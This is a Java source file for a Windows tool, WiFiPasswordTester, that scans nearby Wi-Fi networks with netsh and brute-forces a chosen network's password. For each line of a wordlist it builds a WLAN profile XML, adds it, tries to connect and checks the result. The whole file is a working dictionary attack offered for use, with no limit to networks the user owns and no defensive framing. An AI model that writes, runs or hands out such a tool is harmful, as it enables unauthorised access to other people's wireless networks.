import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.regex.*;

public class WiFiPasswordTester {

    private static class WiFiNetwork {
        String ssid;
        String auth; // Authentication type (WPA2-Personal, WPA-Personal, Open, etc.)
        String encryption; // Encryption type (AES, TKIP, etc.)

        WiFiNetwork(String ssid, String auth, String encryption) {
            this.ssid = ssid;
            this.auth = auth;
            this.encryption = encryption;
        }

        @Override
        public String toString() {
            return ssid + " (" + auth + ", " + encryption + ")";
        }
    }

    public static void main(String[] args) throws IOException, InterruptedException {
        System.out.println("Scanning Wi-Fi networks...");
        List<WiFiNetwork> networks = scanNetworks();
        if (networks.isEmpty()) {
            System.out.println("No Wi-Fi networks found.");
            return;
        }

        for (int i = 0; i < networks.size(); i++) {
            System.out.println((i + 1) + ": " + networks.get(i));
        }

        Scanner scanner = new Scanner(System.in);
        System.out.print("Select a network by number: ");
        int choice = scanner.nextInt();
        scanner.nextLine(); // consume newline

        if (choice < 1 || choice > networks.size()) {
            System.out.println("Invalid selection.");
            return;
        }

        WiFiNetwork targetNetwork = networks.get(choice - 1);
        System.out.println("Selected network: " + targetNetwork.ssid);

        System.out.print("Enter path to password wordlist (default: wordlist.txt): ");
        String wordlistPath = scanner.nextLine().trim();
        if (wordlistPath.isEmpty()) {
            wordlistPath = "wordlist.txt";
        }

        File wordlistFile = new File(wordlistPath);
        if (!wordlistFile.exists()) {
            System.out.println("Wordlist file not found: " + wordlistPath);
            return;
        }

        System.out.println("Starting password attempts...");
        boolean success = tryPasswords(targetNetwork, wordlistFile);

        if (success) {
            System.out.println("Password found and connected successfully!");
        } else {
            System.out.println("Password not found in wordlist.");
        }
    }

    private static List<WiFiNetwork> scanNetworks() throws IOException, InterruptedException {
        List<WiFiNetwork> networks = new ArrayList<>();

        ProcessBuilder pb = new ProcessBuilder("netsh", "wlan", "show", "networks", "mode=bssid");
        Process process = pb.start();

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        String currentSSID = null;
        String auth = null;
        String encryption = null;

        Pattern ssidPattern = Pattern.compile("^SSID \\d+ : (.+)$");
        Pattern authPattern = Pattern.compile("^Authentication\\s+: (.+)$");
        Pattern encryptionPattern = Pattern.compile("^Encryption\\s+: (.+)$");

        while ((line = reader.readLine()) != null) {
            line = line.trim();
            Matcher m;

            m = ssidPattern.matcher(line);
            if (m.find()) {
                if (currentSSID != null) {
                    networks.add(new WiFiNetwork(currentSSID, auth, encryption));
                }
                currentSSID = m.group(1);
                auth = null;
                encryption = null;
                continue;
            }

            m = authPattern.matcher(line);
            if (m.find()) {
                auth = m.group(1);
                continue;
            }

            m = encryptionPattern.matcher(line);
            if (m.find()) {
                encryption = m.group(1);
            }
        }
        // Add last network
        if (currentSSID != null) {
            networks.add(new WiFiNetwork(currentSSID, auth, encryption));
        }

        process.waitFor();
        return networks;
    }

    private static boolean tryPasswords(WiFiNetwork network, File wordlist) throws IOException, InterruptedException {
        BufferedReader br = new BufferedReader(new FileReader(wordlist));
        String password;

        while ((password = br.readLine()) != null) {
            password = password.trim();
            if (password.isEmpty()) continue;

            System.out.println("Trying password: " + password);

            // Create profile XML
            String profileXml = createProfileXml(network.ssid, network.auth, network.encryption, password);
            Path tempProfile = Files.createTempFile("wifi-profile-", ".xml");
            Files.write(tempProfile, profileXml.getBytes());

            // Add profile
            ProcessBuilder addProfilePb = new ProcessBuilder("netsh", "wlan", "add", "profile", "filename=\"" + tempProfile.toString() + "\"", "user=current");
            Process addProfileProcess = addProfilePb.start();
            addProfileProcess.waitFor();

            // Connect
            ProcessBuilder connectPb = new ProcessBuilder("netsh", "wlan", "connect", "name=\"" + network.ssid + "\"", "ssid=\"" + network.ssid + "\"");
            Process connectProcess = connectPb.start();
            connectProcess.waitFor();

            // Wait a bit for connection to establish
            Thread.sleep(5000);

            // Check connection status
            if (isConnectedTo(network.ssid)) {
                Files.deleteIfExists(tempProfile);
                br.close();
                return true;
            }

            // Remove profile to avoid clutter
            ProcessBuilder deleteProfilePb = new ProcessBuilder("netsh", "wlan", "delete", "profile", "name=\"" + network.ssid + "\"");
            Process deleteProfileProcess = deleteProfilePb.start();
            deleteProfileProcess.waitFor();

            Files.deleteIfExists(tempProfile);
        }
        br.close();
        return false;
    }

    private static boolean isConnectedTo(String ssid) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder("netsh", "wlan", "show", "interfaces");
        Process process = pb.start();

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        Pattern ssidPattern = Pattern.compile("^\\s*SSID\\s+: (.+)$");
        Pattern statePattern = Pattern.compile("^\\s*State\\s+: (.+)$");

        String currentSSID = null;
        String state = null;

        while ((line = reader.readLine()) != null) {
            line = line.trim();
            Matcher m;

            m = ssidPattern.matcher(line);
            if (m.find()) {
                currentSSID = m.group(1);
                continue;
            }

            m = statePattern.matcher(line);
            if (m.find()) {
                state = m.group(1);
            }
        }
        process.waitFor();

        return "connected".equalsIgnoreCase(state) && ssid.equals(currentSSID);
    }

    private static String createProfileXml(String ssid, String auth, String encryption, String password) {
        // Map netsh auth/encryption to profile XML values
        String authXml;
        String encryptXml;

        if (auth.toLowerCase().contains("wpa2")) {
            authXml = "WPA2PSK";
        } else if (auth.toLowerCase().contains("wpa3")) {
            authXml = "WPA3SAE"; // WPA3 support may be limited
        } else if (auth.toLowerCase().contains("wpa")) {
            authXml = "WPAPSK";
        } else if (auth.toLowerCase().contains("open")) {
            authXml = "open";
        } else {
            authXml = "WPA2PSK"; // default fallback
        }

        if (encryption.toLowerCase().contains("aes")) {
            encryptXml = "AES";
        } else if (encryption.toLowerCase().contains("tkip")) {
            encryptXml = "TKIP";
        } else {
            encryptXml = "AES"; // default fallback
        }

        // For open networks, no key needed
        if (authXml.equalsIgnoreCase("open")) {
            return "<?xml version=\"1.0\"?>\n" +
                    "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
                    "    <name>" + ssid + "</name>\n" +
                    "    <SSIDConfig>\n" +
                    "        <SSID>\n" +
                    "            <name>" + ssid + "</name>\n" +
                    "        </SSID>\n" +
                    "    </SSIDConfig>\n" +
                    "    <connectionType>ESS</connectionType>\n" +
                    "    <connectionMode>auto</connectionMode>\n" +
                    "    <MSM>\n" +
                    "        <security>\n" +
                    "            <authEncryption>\n" +
                    "                <authentication>open</authentication>\n" +
                    "                <encryption>none</encryption>\n" +
                    "                <useOneX>false</useOneX>\n" +
                    "            </authEncryption>\n" +
                    "        </security>\n" +
                    "    </MSM>\n" +
                    "</WLANProfile>";
        }

        // For secured networks
        return "<?xml version=\"1.0\"?>\n" +
                "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
                "    <name>" + ssid + "</name>\n" +
                "    <SSIDConfig>\n" +
                "        <SSID>\n" +
                "            <name>" + ssid + "</name>\n" +
                "        </SSID>\n" +
                "    </SSIDConfig>\n" +
                "    <connectionType>ESS</connectionType>\n" +
                "    <connectionMode>auto</connectionMode>\n" +
                "    <MSM>\n" +
                "        <security>\n" +
                "            <authEncryption>\n" +
                "                <authentication>" + authXml + "</authentication>\n" +
                "                <encryption>" + encryptXml + "</encryption>\n" +
                "                <useOneX>false</useOneX>\n" +
                "            </authEncryption>\n" +
                "            <sharedKey>\n" +
                "                <keyType>passPhrase</keyType>\n" +
                "                <protected>false</protected>\n" +
                "                <keyMaterial>" + password + "</keyMaterial>\n" +
                "            </sharedKey>\n" +
                "        </security>\n" +
                "    </MSM>\n" +
                "</WLANProfile>";
    }
}
